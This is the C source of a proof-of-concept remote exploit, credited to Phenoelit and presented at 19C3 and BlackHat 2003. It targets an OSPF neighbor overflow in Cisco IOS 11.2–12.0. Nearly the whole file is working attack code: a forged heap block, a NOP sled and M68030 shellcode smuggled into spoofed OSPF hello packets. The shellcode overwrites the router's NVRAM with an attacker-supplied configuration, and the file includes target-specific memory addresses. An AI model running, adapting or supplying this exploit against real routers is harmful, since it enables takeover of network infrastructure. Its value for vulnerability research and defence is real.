
/* Cisco IOS IO memory exploit prove of concept 
 * by FX of Phenoelit <fx@phenoelit.de>
 * http://www.phenoelit.de
 *
 * For: 
 * 	19C3 Chaos Communication Congress 2002 / Berlin
 * 	BlackHat Briefings Seattle 2003
 * 
 * Cisco IOS 11.2.x to 12.0.x OSPF neighbor overflow
 * Cisco Bug CSCdp58462 causes more than 255 OSPF neighbors to overflow a IO memory
 * structure (small buffer header). The attached program is a PoC to exploit 
 * this vulnerability by executing "shell code" on the router and write the 
 * attached configuration into NVRAM to basicaly own the router. 
 *
 * Example:
 * linux# gcc -o OoopSPF OoopSPF.c 
 * linux# ./OoopSPF -s 172.16.0.0 -n 255.255.0.0 -d 172.16.1.4 \
 * 	-f ./small.config -t 0 -a 1.2.3.4 -vv
 *
 * You can see if it worked if a) the router does not crash and b) the output of 
 * "show mem io" looks like this:
 * E40E38      264 E40D04   E40F6C     1                  31632D8   *Packet Data*
 * E40F6C      264 E40E38   E410A0     1                  31632D8   *Packet Data*
 * E410A0      264 E40F6C   E411D4     1                  31632D8   *Packet Data*
 * E411D4  1830400 E410A0   0          0  0       E411F8  808A8B8C  [PHENOELIT]
 *
 * Exploit has to be "triggered". In LAB environment, go to the router and say
 * box# conf t
 * box(config)# buffers small perm 0
 *
 * Greets go to the Phenoelit members, the usual suspects Halvar, Johnny Cyberpunk,
 *   Svoern, Scusi, Pandzilla, and Dizzy, to the #phenoelit people,
 *   Gaus of PSIRT, Nico of Securite.org and Dan Kaminsky.
 *
 * $Id: OoopSPF.c,v 1.4 2003/02/20 16:38:30 root Exp root $
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <time.h>

#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

#define IPTTL			0x80
#define BLABLA			"Phenoelit OoopSPF\n" \
				" Cisco IOS OSPF remote exploit (11.2.-12.0)\n" \
				" (C) 2002/2003 - FX of Phenoelit <fx@phenoelit.de>\n" 
#define IPPROTO_OSPF    0x59
#define IP_ADDR_LEN     4
typedef struct {
        u_int8_t        ihl:4,          /* header length */
                        version:4;      /* version */
        u_int8_t        tos;            /* type of service */
        u_int16_t       tot_len;        /* total length */
        u_int16_t       id;             /* identification */
        u_int16_t       off;            /* fragment offset field */
        u_int8_t        ttl;            /* time to live */
        u_int8_t        protocol;       /* protocol */
        u_int16_t       check;          /* checksum */
        struct in_addr  saddr;
        struct in_addr  daddr;          /* source and dest address */
} iphdr_t;

typedef struct {
    u_int8_t    version                 __attribute__ ((packed));
    u_int8_t    type                    __attribute__ ((packed));
    u_int16_t   length                  __attribute__ ((packed));
    u_int8_t    source[4]               __attribute__ ((packed));
    u_int8_t    area[4]                 __attribute__ ((packed));
    u_int16_t   checksum                __attribute__ ((packed));
    u_int16_t   authtype                __attribute__ ((packed));
    u_int8_t    authdata[8]             __attribute__ ((packed));
} ospf_header_t;

typedef struct {
    u_int8_t    netmask[4]              __attribute__ ((packed));
    u_int16_t   hello_interval          __attribute__ ((packed));
    u_int8_t    options                 __attribute__ ((packed));
    u_int8_t    priority                __attribute__ ((packed));
    u_int8_t    dead_interval[4]        __attribute__ ((packed));
    u_int8_t    designated[4]           __attribute__ ((packed));
    u_int8_t    backup[4]               __attribute__ ((packed));
} ospf_hello_t;


//
// Target definitions 
//

typedef struct {
    char	*description;
    int		n_neig;
    int		data_start;
    u_int32_t	blockbegin;
    u_int32_t	prev;
    u_int32_t	nop_sleet;
    u_int32_t	stack_address;
    u_int32_t	iomem_end;
} targets_t;

targets_t	targets[] = {
    { // #0 Phenoelit labs 2503 
	"2503, 11.3(11b) IP only [c2500-i-l.113-11b.bin], 14336K/2048K (working)",
	256,		// # of neighbor announcements 
	0xe5, 		// data start
	0xE411D4,	// block begin
	0xE410B4,	// PREV
	6,		// nop_sleet after FAKE BLOCK
	0x079B48,	// Check heaps stack PC
	0x00FFFFFF	// IO mem end
    },
    { // #1 Phenoelit labs 2501 
	"2501, 11.3(11a) IP only [c2500-i-l.113-11a.bin], 14336K/2048K (working)",
	256,		// # of neighbor announcements 
	0xe5, 		// data start
	0x00E31EA4,	// block begin
	0x00E31D84,	// PREV
	6,		// nop_sleet after FAKE BLOCK
	0x00079918,	// Check heaps stack PC (using IOStack.pl)
	0x00FFFFFF	// IO mem end
    }
};

#define TARGETS (sizeof(targets)/sizeof(targets_t)-1)

//
// NVRAM header structure
//

typedef struct {
    u_int16_t   magic                   __attribute__((packed));
    u_int16_t   one                     __attribute__((packed));
    u_int16_t   checksum                __attribute__((packed));
    u_int16_t   IOSver                  __attribute__((packed));
    u_int32_t   unknown                 __attribute__((packed));
    u_int32_t   ptr                     __attribute__((packed));
    u_int32_t   size                    __attribute__((packed));
} nvheader_t;

//
// FAKE BLOCK definitions
//

typedef struct {
    u_int32_t	redzone		__attribute__((packed));
    u_int32_t	magic		__attribute__((packed));
    u_int32_t	pid		__attribute__((packed));
    u_int32_t	proc		__attribute__((packed));
    u_int32_t	name		__attribute__((packed));
    u_int32_t	pc		__attribute__((packed));
    u_int32_t	next		__attribute__((packed));
    u_int32_t	prev		__attribute__((packed));
    u_int32_t	size		__attribute__((packed));
    u_int32_t	refcnt		__attribute__((packed));
    u_int32_t	pad1		__attribute__((packed));
    u_int32_t	freemagic	__attribute__((packed));
    u_int32_t	lastdealloc	__attribute__((packed));
    u_int32_t	pad2		__attribute__((packed));
    u_int32_t	pad3		__attribute__((packed));
    u_int32_t	free_next	__attribute__((packed));
    u_int32_t	free_prev	__attribute__((packed));
} block_t;

char		fakeblock[] =
        "\xFD\x01\x10\xDF"      // RED
        "\xAB\x12\x34\xCD"      // MAGIC
        "\xFF\xFF\xFF\xFF"      // PID
        "\x80\x81\x82\x83"      // PROC
        "\x00\xE4\x12\x00"      // NAME	(Message)
        "\x80\x8a\x8b\x8c"      // PC
	"\x00\x00\x00\x00"      // NEXT (no following block)
        "\x00\xE4\x10\xB4"      // PREV (correct for 0xE411d4)
	"\x00\x0D\xF7\x02"      // Size CORRECT for 0xE411D4
        "\x00\x00\x00\x00"      // Reference count
        "\x00\x00\x00\x00"      // PADDING
        "\xDE\xAD\xBE\xEF"      // FREE MAGIC
	"[PHE"			// last delocator
	"NOEL"			// PADDING
	"IT]\x00"		// PADDING
	"\x00\xE4\x12\x20"	// FREE NEXT in our block
	"\x00\x07\x9B\x48"	// FREE PREV (Check heaps stack PC)
	;
block_t		*bpatch = (block_t*)fakeblock;

//
// Cisco code for M68030 CPU and 2500 NVRAM layout
//
char		ccode[] =
        "\x46\xFC\x27\x00"              //movew #9984,%sr (0x00E41220)
        "\x43\xFA\x00\x48"              //lea %pc@(4e <config>),%a1 (0x00E41224)
        "\x24\x7C\x02\x00\x00\x06"      //moveal #33554438,%a2 (0x00E41228)
        "\xB3\x81"                      //eorl %d1,%d1 (0x00E4122E)
        "\x74\x01"                      //moveq #1,%d2 (0x00E41230)
        "\x22\x3C\x01\x01\x01\x01"      //movel #16843009,%d1 (0x00E41232)
        "\x14\xD9"                      //moveb %a1@+,%a2@+ (0x00E41238)
        "\x32\x3C\xFF\xFF"              //movew #-1,%d1 (0x00E4123A)
        "\x93\x42"                      //subxw %d2,%d1 (0x00E4123E)
        "\x6B\x00\xFF\xFC"              //bmiw 1e <write_delay> (0x00E41240)
        "\x0C\x91\xCA\xFE\xF0\x0D"      //cmpil #-889262067,%a1@ (0x00E41244)
        "\x66\x00\xFF\xEC"              //bnew 18 <copy_config> (0x00E4124A)
        "\x14\xFC\x00\x00"              //moveb #0,%a2@+ (0x00E4124E)
        "\x32\x3C\xFF\xFF"              //movew #-1,%d1 (0x00E41252)
        "\x93\x42"                      //subxw %d2,%d1 (0x00E41256)
        "\x6B\x00\xFF\xFC"              //bmiw 36 <write_delay2> (0x00E41258)
        "\xB5\xFC\x02\x00\x07\x00"      //cmpal #33556224,%a2 (0x00E4125C)
        "\x6D\x00\xFF\xEA"              //bltw 2e <delete_config> (0x00E41262)
        "\x22\x7C\x03\x00\x00\x60"      //moveal #50331744,%a1 (0x00E41266)
        "\x4E\xD1"                      //jmp %a1@ (0x00E4126C)

    ;

char		terminator[]	= "\xCA\xFE\xF0\x0D";
char		nop[] 		= "\x4E\x71";

//
// Global variables to pass the current buffer location to the 
// OSPF packet generator function
//
int 		payloadc=0;
char		*payload=NULL;
// packet counter (global)
unsigned int 	pc=0;


//
// Configuration
//
struct {
    int			verbose;
    char		*device;
    struct in_addr	*target;
    u_int32_t		src_net;
    u_int32_t		src_mask;
    u_int32_t		area;
    int			directed;
    int			test_only;

    // fake block constants
    int			n_neig;
    int			data_start;
    u_int32_t		blockbegin;
    u_int32_t		prev;
    u_int32_t		nop_sleet;
    u_int32_t		stack_address;
    u_int32_t		iomem_end;

    // other stuff 
    char		*filename;
    int			target_sel;
} cfg;


u_char	*construct_ospf(struct in_addr *dd, struct in_addr *src,
	u_int16_t autosys, int *psize);
int	init_socket_IP4(int broadcast);
int     sendpack_IP4(int sfd, u_char *packet,int plength);
u_int16_t chksum(u_char *data, unsigned long count);
void    *smalloc(size_t size);
void	hexdump(unsigned char *bp, unsigned int length);
void	usage(char *s);

int main(int argc, char **argv) {
    char	option;
    extern char	*optarg;
    int		sfd;

    unsigned int	i=0;
    u_int32_t		countip=20;

    /* confg file */
    int                 fd;
    struct stat         sb;

    u_char              *buffer;
    u_char              *p;
    nvheader_t          *nvh;
    unsigned int        len;
    u_int16_t           cs1;
    
    // final overflow
    char		*overflow;
    int			osize=0;

    
    printf(BLABLA);

    memset(&cfg,0,sizeof(cfg));
    while ((option=getopt(argc,argv,"vDTd:s:n:L:F:f:t:S:a:"))!=EOF) {
	switch (option) {
	    case 'v':	cfg.verbose++;
			break;
	    case 'D':	cfg.directed++;
			break;
	    case 'T':	cfg.test_only++;
			break;
	    case 'd':	cfg.target=(struct in_addr *)smalloc(sizeof(struct in_addr));
			if (inet_aton(optarg,cfg.target)==0) {
			    fprintf(stderr,"Your destination is bullshit\n");
			    return (1);
			}
			break;
	    case 's':	if (inet_aton(optarg,(struct in_addr*)&(cfg.src_net))==0) {
			    fprintf(stderr,"Your source net is wrong\n");
			    return (1);
			}
			break;
	    case 'n':	if (inet_aton(optarg,(struct in_addr*)&(cfg.src_mask))==0) {
			    fprintf(stderr,"Your source mask is wrong\n");
			    return (1);
			}
			break;
	    case 'L':	cfg.n_neig=(unsigned int)strtoul(optarg,(char **)NULL,10);
			break;
	    case 'F':	cfg.data_start=(unsigned int)strtoul(optarg,(char **)NULL,16);
			break;
	    case 'f':	cfg.filename=(char *)smalloc(strlen(optarg)+1);
			strcpy(cfg.filename,optarg);
			break;
	    case 't':	cfg.target_sel=(unsigned int)strtoul(optarg,(char **)NULL,10);
			if (cfg.target_sel>TARGETS) {
			    fprintf(stderr,"Target number unknown\n");
			    return (1);
			}
			break;
	    case 'S':	cfg.nop_sleet=(unsigned int)strtoul(optarg,(char **)NULL,10);
			break;
	    case 'a':	if (inet_aton(optarg,(struct in_addr*)&(cfg.area))==0) {
			    fprintf(stderr,"Your area doesn't make sense.\n");
			    return (1);
			}
			break;
	    default:	usage(argv[0]);
	}
    }

    if (cfg.target_sel>TARGETS) {
	fprintf(stderr,"Error: user too stupid (check -t)\n");
	return (-1);
    }
    if (cfg.n_neig==0) cfg.n_neig=targets[cfg.target_sel].n_neig;
    if (cfg.data_start==0) cfg.data_start=targets[cfg.target_sel].data_start;
    if (cfg.blockbegin==0) cfg.blockbegin=targets[cfg.target_sel].blockbegin;
    if (cfg.prev==0) cfg.prev=targets[cfg.target_sel].prev;
    if (cfg.nop_sleet==0) cfg.nop_sleet=targets[cfg.target_sel].nop_sleet;
    if (cfg.stack_address==0) cfg.stack_address=targets[cfg.target_sel].stack_address;
    if (cfg.iomem_end==0) cfg.iomem_end=targets[cfg.target_sel].iomem_end;

    //
    // Check the parameters and set up a socket
    //
    cfg.src_net=cfg.src_net&cfg.src_mask;

    if ( (cfg.src_net==0)||(cfg.src_mask==0)
	    ||(cfg.filename==NULL)||(cfg.target==NULL)) {
	usage(argv[0]);
    }

    if ((sfd=init_socket_IP4(1))<1) {
	fprintf(stderr,"Could not get a socket for you\n");
	return (-1);
    }

    //
    // Get some info back to the user if he requested verbose
    //
    if (cfg.verbose) {
	if (cfg.directed) 
	    printf("\twith unicast target %s\n",inet_ntoa(*cfg.target));
	else 
	    printf("\twith default destination addresses\n");
	printf("\twith source network %s/",
		inet_ntoa(*(struct in_addr*)&(cfg.src_net)));
	printf("%s\n",inet_ntoa(*(struct in_addr*)&(cfg.src_mask)));
        printf("Using Target: %s\n",targets[cfg.target_sel].description);
	printf( "\t# of neighbors: %u\n"
		"\tdata start    : %u\n"
		"\tBlock address : 0x%08X\n"
		"\tPREV pointer  : 0x%08X\n"
		"\tNOP sleet     : %u\n"
		"\tStack address : 0x%08X\n"
		"\tIO Memory end : 0x%08X\n",
		cfg.n_neig,cfg.data_start,cfg.blockbegin,cfg.prev,
		cfg.nop_sleet,cfg.stack_address,cfg.iomem_end);
    }

    //
    // Patch the fake block with the new values
    //
    bpatch->prev=htonl(cfg.prev);
    bpatch->size=htonl(
	    (cfg.iomem_end
	    -39 // minus block header in bytes - 1
	    -cfg.blockbegin) / 2);
    bpatch->free_next=htonl(cfg.blockbegin+sizeof(fakeblock)-5/* RED ZONE */
	    +((sizeof(nop)-1)*cfg.nop_sleet));
    bpatch->free_prev=htonl(cfg.stack_address);
    bpatch->name=htonl(cfg.blockbegin+44);

    /* 
     * Load Config
     * - load into buffer
     * - prepare NVRAM header
     * - calculate checksum
     * -> *buffer contains payload
     */
    if (cfg.filename==NULL) return (-1);
    if (stat(cfg.filename,&sb)!=0) {
        fprintf(stderr,"Could not stat() file %s\n",cfg.filename);
        return (-1);
    }

    if ((fd=open(cfg.filename,O_RDONLY))<0) {
        fprintf(stderr,"Could not open() file %s\n",cfg.filename);
        return (-1);
    }

    len=sb.st_size;
    if ((buffer=(char *)malloc(len+sizeof(nvheader_t)+10))==NULL) {
        fprintf(stderr,"Malloc() failed\n");
        return (-1);
    }
    memset(buffer,0,len+sizeof(nvheader_t)+10);

    p=buffer+sizeof(nvheader_t);
    if (cfg.verbose) printf("%d bytes config read\n",read(fd,p,len));
    close(fd);

    // pad config so it is word bound for the 0xcafef00d test
    if ((len%2)!=0) {
	strcat(p,"\x0A");
	len++;
	if (cfg.verbose) printf("Padding config by one\n");
    }

    nvh=(nvheader_t *)buffer;
    nvh->magic=htons(0xABCD);		
    nvh->one=htons(0x0001);		// is always one 
    nvh->IOSver=htons(0x0B03);		// IOS version
    nvh->unknown=htonl(0x00000014);	// something, 0x14 just works
    nvh->ptr=htonl(0x000D199F);		// config end ptr 
    nvh->size=htonl(len);

    cs1=chksum(buffer,len+sizeof(nvheader_t)+2);
    if (cfg.verbose) printf("Checksum: %04X\n",htons(cs1));
    nvh->checksum=cs1;

    //
    // Put the overflow together
    //
    // (1) calculate size of the whole thing
    osize=sizeof(fakeblock)-1+
	  (cfg.nop_sleet * (sizeof(nop)-1))+
	  sizeof(ccode)-1+
	  sizeof(nvheader_t)+
	  len+
	  sizeof(terminator)-1;
    if ((osize/4)>cfg.data_start) {
	fprintf(stderr,"ERROR: The whole thing is too large!\n");
	return (-1);
    } else {
	printf("Using %u out of %u bytes (overflow: %u bytes)\n",
		osize,cfg.data_start*4,cfg.n_neig*4);
    }
    //
    // adjust osize ot be 4byte bound
    //
    if ((osize%4!=0)) osize+=osize%4;
    overflow=smalloc(osize);

    //
    // (2) copy the fakeblock in the buffer
    //
    memcpy(overflow,fakeblock,sizeof(fakeblock)-1);
    p=(void *)overflow+sizeof(fakeblock)-1;

    //
    // (3) Add NOPs to the buffer
    //
    for (i=0;i<cfg.nop_sleet;i++) {
	memcpy(p,nop,sizeof(nop)-1);
	p+=sizeof(nop)-1;
    }

    //
    // (4) Add the ccode
    //
    memcpy(p,ccode,sizeof(ccode)-1);
    p+=sizeof(ccode)-1;

    //
    // (5) Add the NVRAM structure and config
    //
    memcpy(p,buffer,len+sizeof(nvheader_t));
    p+=len+sizeof(nvheader_t);

    //
    // (6) finish off with terminator
    //
    memcpy(p,terminator,sizeof(terminator)-1);

    if (cfg.verbose>1) hexdump(overflow,osize);
    if (cfg.test_only) return (0);

    payload=overflow+(osize-4);
    payloadc=osize;

    // *************************
    // PERFORM THE OVERFLOW
    // *************************
    for (i=0;i<cfg.n_neig;i++) {
	u_char		*pack;
	int		plen;
	u_int32_t	uip;

OwnHostException:
	countip++;
	uip=htonl(countip);
	uip=uip&(~cfg.src_mask);
	uip=uip|cfg.src_net;

	if (!memcmp(&uip,cfg.target,IP_ADDR_LEN)) {
	    if (cfg.verbose>2) 
		printf("-- Skipping %s\n",inet_ntoa(*(cfg.target)));
	    else {
		printf("*"); fflush(stdout);
	    }
	    goto OwnHostException;
	}

	if (cfg.verbose>2)
	    printf("\tsending from %15s... ",inet_ntoa(*(struct in_addr*)&(uip)));
	else {
	    printf("."); fflush(stdout);
	}

	// Make and send OSPF
	pack=construct_ospf(cfg.target,
		(struct in_addr *)&uip,0,&plen);
	sendpack_IP4(sfd,pack,plen);
	free(pack);

	if (cfg.verbose>2) printf("\n");
	usleep(1);
    }

    close(sfd);
    printf("\n");

    return 0;
}

u_char	*construct_ospf(struct in_addr *dd, struct in_addr *src,
	u_int16_t autosys, int *psize) {
    u_char			*tpacket;
    iphdr_t			*iph;
    u_int16_t			cs;		/* checksum */
    char			all_ospf[]="224.0.0.5";
    ospf_header_t       	*ospfh;
    ospf_hello_t        	*ohelo;

    *psize=sizeof(iphdr_t)+sizeof(ospf_header_t)+sizeof(ospf_hello_t);
    tpacket=(u_char *)smalloc(*psize
	    +3 /* for my checksum function, which sometimes 
		  steps over the mark */
	    );

    // IP packet
    iph=(iphdr_t *)tpacket;

    iph->version=4;
    iph->ihl=sizeof(iphdr_t)/4;

    iph->tot_len=htons(*psize);
    iph->ttl=IPTTL;
    iph->protocol=IPPROTO_OSPF;

    memcpy(&(iph->saddr.s_addr),&(src->s_addr),IP_ADDR_LEN);
    if (!cfg.directed)
	inet_aton(all_ospf,(struct in_addr *)&(iph->daddr));
    else
	memcpy(&(iph->daddr.s_addr),&(dd->s_addr),IP_ADDR_LEN);

    // OSPF header
    ospfh=(ospf_header_t *)((void *)tpacket+sizeof(iphdr_t));
    ohelo=(ospf_hello_t *)((void *)tpacket+sizeof(iphdr_t)+sizeof(ospf_header_t));
    ospfh->version=2;
    ospfh->type=1;
    ospfh->length=htons(sizeof(ospf_header_t)+sizeof(ospf_hello_t));
    memcpy(&(ospfh->area),&(cfg.area),4);

    // Increment the packets sent
    pc++;

    // 
    // If we are in the range of the whole overflow thingy, copy the appropriate
    // 4 bytes into the source address in the OSPF header
    //
    if ( (pc <= cfg.data_start) && 
	      (pc > cfg.data_start-(payloadc/4) ) ) {
	memcpy(&(ospfh->source),payload,IP_ADDR_LEN);
	payload-=4;
    }
    // 
    // well, we are not in there, so we set it to some value
    //
    else {
	ospfh->source[0]=0xCA;
	ospfh->source[1]=0xFE;
	ospfh->source[2]=0xBA;
	ospfh->source[3]=0xBE;
    }

    // be verbose
    if (cfg.verbose>2) printf(" [0x%08X] ",ntohl(*((unsigned int*)&(ospfh->source))));

    // compile the rest of the packet
    memcpy(&(ohelo->netmask),&(cfg.src_mask),4);
    ohelo->hello_interval=htons(10);
    ohelo->options=0x2;
    ohelo->priority=2;
    ohelo->dead_interval[3]=40;
    memcpy(&(ohelo->designated),&(src->s_addr),IP_ADDR_LEN);

    cs=chksum((u_char *)ospfh,sizeof(ospf_header_t)+sizeof(ospf_hello_t));
    ospfh->checksum=cs;

    return tpacket;
}

// Dirty stuff from IRPAS
int init_socket_IP4(int broadcast) {
    int                 sfd;
    int			t=1;

    if ((sfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {
        perror("socket()");
        return(-1);
    }

    /* make a broadcast enabled socket if desired */
    if (broadcast) {
        if (setsockopt(
                    sfd,SOL_SOCKET,SO_BROADCAST,
                    (void *)&t,sizeof(int)) != 0) {
            perror("setsockopt");
            return (-1);
        }
    }
    return sfd;
}

int     sendpack_IP4(int sfd, u_char *packet,int plength) {
    struct sockaddr_in  sin;
    iphdr_t             *iph;

    iph=(iphdr_t *)packet;

    memset(&sin,0,sizeof(struct sockaddr_in));
    sin.sin_family=AF_INET;
    sin.sin_port=htons(0);
    memcpy(&(sin.sin_addr),&(iph->daddr),sizeof(sin.sin_addr));

    if (sendto(sfd,packet,plength,0,
                (struct sockaddr *) &sin,
                sizeof(struct sockaddr_in)) <=0) {
        perror("sendto()");
        return(-1);
    }

    return 0;
}


u_int16_t chksum(u_char *data, unsigned long count) {
    u_int32_t           sum = 0;
    u_int16_t           *wrd;

    wrd=(u_int16_t *)data;
    while( count > 1 )  {
        sum = sum + *wrd;
        wrd++;
        count -= 2;
    }

    if( count > 0 ) sum = sum + ((*wrd &0xFF)<<8);
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (~sum);
}

void    *smalloc(size_t size) {
    void        *p;

    if ((p=malloc(size))==NULL) {
        fprintf(stderr,"smalloc(): malloc failed\n");
        exit (-2);
    }
    memset(p,0,size);
    return p;
}


// /dirty 



/* A better version of hdump, from Lamont Granquist.  Modified slightly
 * by Fyodor (fyodor@DHP.com) 
 * obviously stolen by FX from nmap (util.c)*/
void hexdump(unsigned char *bp, unsigned int length) {

  /* stolen from tcpdump, then kludged extensively */

  static const char asciify[] = "................................ !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~.................................................................................................................................";

  register const u_short *sp;
  register const u_char *ap;
  register u_int i, j;
  register int nshorts, nshorts2;
  register int padding;

  printf("\n\t");
  padding = 0;
  sp = (u_short *)bp;
  ap = (u_char *)bp;
  nshorts = (u_int) length / sizeof(u_short);
  nshorts2 = (u_int) length / sizeof(u_short);
  i = 0;
  j = 0;
  while(1) {
    while (--nshorts >= 0) {
      printf(" %04x", ntohs(*sp));
      sp++;
      if ((++i % 8) == 0)
        break;
    }
    if (nshorts < 0) {
      if ((length & 1) && (((i-1) % 8) != 0)) {
        printf(" %02x  ", *(u_char *)sp);
        padding++;
      }
      nshorts = (8 - (nshorts2 - nshorts));
      while(--nshorts >= 0) {
        printf("     ");
      }
      if (!padding) printf("     ");
    }
    printf("  ");

    while (--nshorts2 >= 0) {
      printf("%c%c", asciify[*ap], asciify[*(ap+1)]);
      ap += 2;
      if ((++j % 8) == 0) {
        printf("\n\t");
        break;
      }
    }
    if (nshorts2 < 0) {
      if ((length & 1) && (((j-1) % 8) != 0)) {
        printf("%c", asciify[*ap]);
      }
      break;
    }
  }
  if ((length & 1) && (((i-1) % 8) == 0)) {
    printf(" %02x", *(u_char *)sp);
    printf("                                       %c", asciify[*ap]);
  }
  printf("\n");
}

void usage(char *s) {
    int		i;

    fprintf(stderr,"Usage: \n"
	    "%s -s <src net> -n <src mask> -d <target rtr ip> -f <file>"
		" -t <targ#>\n"
	    "Options:\n"
	    "-s <src net>  Use this network as source (as in target config)\n"
	    "-n <src mask> Use this netmask as source (as in target config)\n"
	    "-d <target>   This is the target router interface IP\n"
	    "-f <file>     Use this as the new config for the router\n"
	    "-t #          Use this target value set (see below)\n"
	    "-a <area>     Use this OSPF area\n"
	    "-v            Be verbose (-vv or -vvv recommended)\n"
	    "-D            Directed attack (unicast) for 11.x targets\n"
	    "-T            Test only - don't send\n"
	    " --- barely used options ---\n"
	    "-L #          Number of neighbors to announce (overflow size)\n"
	    "-F #          Start of data (seen reverse to overflow)\n"
	    "-S #          NOP sleet\n"
	    "\n"
	    "Known targets:\n"
	    ,s);
    
    for (i=0;i<=TARGETS;i++) 
	fprintf(stderr,"\t%s\n",targets[i].description);

    exit (1);
}